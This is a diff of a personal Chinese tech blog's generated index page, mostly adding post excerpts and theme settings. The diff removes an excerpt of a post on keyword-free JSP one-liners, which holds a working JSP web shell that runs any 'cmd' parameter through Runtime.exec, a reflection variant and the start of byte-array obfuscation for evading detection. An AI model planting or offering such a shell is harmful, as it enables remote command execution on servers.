@@ -17,7 +17,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":30,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":30,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta property="og:type" content="website">
@@ -171,10 +171,8 @@
     </header>
 
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
 
 
     <main class="main">
@@ -188,10 +186,495 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/31/springboot%E9%98%B2%E5%BE%A1xss%E7%9A%84%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/luoqixi.png">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/31/springboot%E9%98%B2%E5%BE%A1xss%E7%9A%84%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">springboot防御xss的方法学习记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-31 19:09:49" itemprop="dateCreated datePublished" datetime="2022-08-31T19:09:49+08:00">2022-08-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-09-01 17:45:31" itemprop="dateModified" datetime="2022-09-01T17:45:31+08:00">2022-09-01</time>
+              </span>
+
+          
+            <span id="/2022/08/31/springboot%E9%98%B2%E5%BE%A1xss%E7%9A%84%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-meta-item leancloud_visitors" data-flag-title="springboot防御xss的方法学习记录" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/08/31/springboot%E9%98%B2%E5%BE%A1xss%E7%9A%84%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/08/31/springboot%E9%98%B2%E5%BE%A1xss%E7%9A%84%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>对springBoot防御xss的一般方法的学习</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/08/31/springboot%E9%98%B2%E5%BE%A1xss%E7%9A%84%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/26/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E5%99%A8%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/luoqixi.png">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/26/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E5%99%A8%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">java多线程下载器</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-26 19:09:49" itemprop="dateCreated datePublished" datetime="2022-08-26T19:09:49+08:00">2022-08-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-09-01 18:08:06" itemprop="dateModified" datetime="2022-09-01T18:08:06+08:00">2022-09-01</time>
+              </span>
+
+          
+            <span id="/2022/08/26/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E5%99%A8%E8%AE%B0%E5%BD%95/" class="post-meta-item leancloud_visitors" data-flag-title="java多线程下载器" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/08/26/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E5%99%A8%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/08/26/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E5%99%A8%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>简单的java多线程下载器的学习记录</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/08/26/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E5%99%A8%E8%AE%B0%E5%BD%95/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/04/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/luoqixi.png">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/04/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">java多线程学习记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-04 22:46:29" itemprop="dateCreated datePublished" datetime="2022-08-04T22:46:29+08:00">2022-08-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-09-09 23:53:09" itemprop="dateModified" datetime="2022-09-09T23:53:09+08:00">2022-09-09</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2022/08/04/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-meta-item leancloud_visitors" data-flag-title="java多线程学习记录" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/08/04/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/08/04/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>java多线程学习记录</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/08/04/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/18/%E8%83%8C%E5%BF%98%E5%BD%95%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/luoqixi.png">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/07/18/%E8%83%8C%E5%BF%98%E5%BD%95%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">背忘录项目开发记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-18 21:17:06" itemprop="dateCreated datePublished" datetime="2022-07-18T21:17:06+08:00">2022-07-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-29 18:40:40" itemprop="dateModified" datetime="2022-07-29T18:40:40+08:00">2022-07-29</time>
+              </span>
+
+          
+            <span id="/2022/07/18/%E8%83%8C%E5%BF%98%E5%BD%95%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/" class="post-meta-item leancloud_visitors" data-flag-title="背忘录项目开发记录" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/07/18/%E8%83%8C%E5%BF%98%E5%BD%95%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/07/18/%E8%83%8C%E5%BF%98%E5%BD%95%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="springboot配置跨域请求"><a href="#springboot配置跨域请求" class="headerlink" title="springboot配置跨域请求"></a>springboot配置跨域请求</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.CorsRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebMvcConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addCorsMappings</span><span class="params">(CorsRegistry registry)</span> </span>&#123;</span><br><span class="line">        registry.addMapping(<span class="string">&quot;/**&quot;</span>)</span><br><span class="line">                .allowedHeaders(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;X-Requested-With&quot;</span>,<span class="string">&quot;accept,Origin&quot;</span>,<span class="string">&quot;Access-Control-Request-Method&quot;</span>,<span class="string">&quot;Access-Control-Request-Headers&quot;</span>,<span class="string">&quot;token&quot;</span>)</span><br><span class="line">                .allowedMethods(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">                .allowedOriginPatterns(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">                .allowCredentials(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="验证输入是否为单词"><a href="#验证输入是否为单词" class="headerlink" title="验证输入是否为单词"></a>验证输入是否为单词</h3><p>因为python有一个<code>pyenchant</code>库恰好具备这样的功能</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/07/18/%E8%83%8C%E5%BF%98%E5%BD%95%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/18/vue%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/luoqixi.png">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/07/18/vue%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">vue学习记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-18 20:38:40" itemprop="dateCreated datePublished" datetime="2022-07-18T20:38:40+08:00">2022-07-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-08-23 15:57:22" itemprop="dateModified" datetime="2022-08-23T15:57:22+08:00">2022-08-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/vue/" itemprop="url" rel="index"><span itemprop="name">vue</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2022/07/18/vue%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-meta-item leancloud_visitors" data-flag-title="vue学习记录" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/07/18/vue%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/07/18/vue%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>写第一个vue项目时遇到的一些问题和解决方法</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/07/18/vue%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="image" content="/../images/luoqixi.png">
       <meta itemprop="name" content="blueSatchel">
       <meta itemprop="description" content="">
     </span>
@@ -232,6 +715,13 @@
             </span>
 
           
+            <span id="/2022/06/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-meta-item leancloud_visitors" data-flag-title="fastjson反序列化漏洞学习记录" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
   
   <span class="post-meta-item">
     
@@ -286,7 +776,7 @@
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/16/jsp%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E4%B8%80%E5%8F%A5%E8%AF%9D/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="image" content="/../images/luoqixi.png">
       <meta itemprop="name" content="blueSatchel">
       <meta itemprop="description" content="">
     </span>
@@ -318,6 +808,13 @@
               </span>
 
           
+            <span id="/2022/05/16/jsp%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E4%B8%80%E5%8F%A5%E8%AF%9D/" class="post-meta-item leancloud_visitors" data-flag-title="jsp无关键字一句话" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
   
   <span class="post-meta-item">
     
@@ -344,23 +841,14 @@
       
           <h2 id="jsp无关键字一句话"><a href="#jsp无关键字一句话" class="headerlink" title="jsp无关键字一句话"></a>jsp无关键字一句话</h2><p>通过ascii码与字符之间的转换,加上通过反射加载类,实现无关键字一句话</p>
 <h4 id="py脚本script-str2ascii"><a href="#py脚本script-str2ascii" class="headerlink" title="py脚本script_str2ascii"></a>py脚本<code>script_str2ascii</code></h4><p>首先写一个简单的py脚本,转换命令为byte数组</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="built_in">input</span>(<span class="string">&quot;input code&quot;</span>)</span><br><span class="line">arr=[]</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> cmd:</span><br><span class="line">    arr.append(<span class="built_in">ord</span>(char))</span><br><span class="line"><span class="built_in">print</span>(arr)</span><br></pre></td></tr></table></figure>
-
-<h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>接下来找一个简单的小马,进行改造</p>
-<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">    <span class="comment">//加一个系统的判断</span></span><br><span class="line">    String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">    <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">    BufferedReader bufferedReader;</span><br><span class="line">    <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">        isWin = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">            bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String len;</span><br><span class="line">        <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">   out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + res.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="通过反射改变获取类并执行的方式"><a href="#通过反射改变获取类并执行的方式" class="headerlink" title="通过反射改变获取类并执行的方式"></a>通过反射改变获取类并执行的方式</h4><p>主要目的是将runtime相关的类和函数通过反射进行修改</p>
-<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//这个forName加载类的时候会执行类内的静态代码块</span></span><br><span class="line">    Method method = aClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">    Object o = method.invoke(<span class="keyword">null</span>);<span class="comment">//这里获取到runtime类</span></span><br><span class="line">    Method method1 = aClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">    method1.invoke(o,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>通过反射加载runtime类的方式可行,并且成功弹出了计算器</p>
-<p>接下来通过ascii数组,替换其中比较敏感的字符串</p>
-<p>上面那个小马里面别的不关键的东西懒得写了…..</p>
-<p><strong>这里可以使用byte数组,原因是当前涉及到的字符串中的所有字符ascii码均在127以下</strong></p>
-<h4 id="加入byte数组"><a href="#加入byte数组" class="headerlink" title="加入byte数组"></a>加入byte数组</h4><p>通过byte数组修饰以下关键字</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">byte</span>[] a=&#123;<span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span 